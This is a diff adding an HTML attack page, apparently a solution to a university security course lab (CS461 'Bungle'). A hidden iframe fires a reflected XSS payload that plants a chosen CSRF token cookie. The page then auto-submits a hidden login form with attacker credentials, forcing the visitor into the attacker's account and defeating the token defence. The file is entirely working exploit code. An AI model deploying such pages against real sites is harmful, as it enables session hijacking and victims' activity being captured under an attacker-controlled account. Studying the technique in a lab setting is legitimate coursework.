@@ -1,0 +1,31 @@
+<html>
+    <body>
+        <iframe name="myIframe" 
+                style="display: none; width:0; height:0; border:0;" 
+                src="http://bungle-cs461.csl.illinois.edu/search?q=<script>document.cookie = 'csrf_token=3371c5cb95501bbd6eee8f923b89b247'</script>&csrfdefense=1&xssdefense=0"
+                onload="submitLoginForm()">
+        </iframe>
+
+        <form name="form"
+              target="myIframe" 
+              action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=1&xssdefense=0" 
+              method="POST">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="l33th4x">
+            <input type="hidden" name="csrf_token" value="3371c5cb95501bbd6eee8f923b89b247">
+        </form>
+
+        <script>
+            var hasSubmitted = false;
+
+            function submitLoginForm() {
+                if (!hasSubmitted) {
+                    hasSubmitted = true;
+                    setTimeout(function() {
+                        document.form.submit();
+                    }, 100);
+                }
+            }
+        </script>
+    </body>
+</html>
